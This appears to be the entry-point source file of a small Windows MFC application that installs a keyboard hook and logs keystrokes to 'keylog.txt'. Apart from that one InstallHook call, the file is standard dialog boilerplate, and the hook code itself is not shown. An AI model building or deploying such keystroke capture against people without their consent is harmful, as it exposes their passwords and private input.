// KeyBoardApp.cpp : Defines the class behaviors for the application.
//

#include "stdafx.h"
#include "KeyBoardApp.h"
#include "KeyBoardAppDlg.h"

#include "HookKeyBoard.h"


#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CKeyBoardAppApp

BEGIN_MESSAGE_MAP(CKeyBoardAppApp, CWinApp)
	//{{AFX_MSG_MAP(CKeyBoardAppApp)
	//}}AFX_MSG
	ON_COMMAND(ID_HELP, CWinApp::OnHelp)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CKeyBoardAppApp construction

CKeyBoardAppApp::CKeyBoardAppApp()
{
}

/////////////////////////////////////////////////////////////////////////////
// The one and only CKeyBoardAppApp object

CKeyBoardAppApp theApp;

/////////////////////////////////////////////////////////////////////////////
// CKeyBoardAppApp initialization

BOOL CKeyBoardAppApp::InitInstance()
{
	AfxEnableControlContainer();

	// Standard initialization

#ifdef _AFXDLL
	Enable3dControls();			// Call this when using MFC in a shared DLL
#else
	Enable3dControlsStatic();	// Call this when linking to MFC statically
#endif

	if (!InstallHook("keylog.txt"))
		AfxMessageBox("Install Hook failed!");

	CKeyBoardAppDlg dlg;
	m_pMainWnd = &dlg;
	int nResponse = dlg.DoModal();
	if (nResponse == IDOK)
	{
	}
	else if (nResponse == IDCANCEL)
	{
	}

	// Since the dialog has been closed, return FALSE so that we exit the
	//  application, rather than start the application's message pump.
	return FALSE;
}

int CKeyBoardAppApp::ExitInstance() 
{
	// TODO: Add your specialized code here and/or call the base class
	//UnHook();
	return CWinApp::ExitInstance();
}
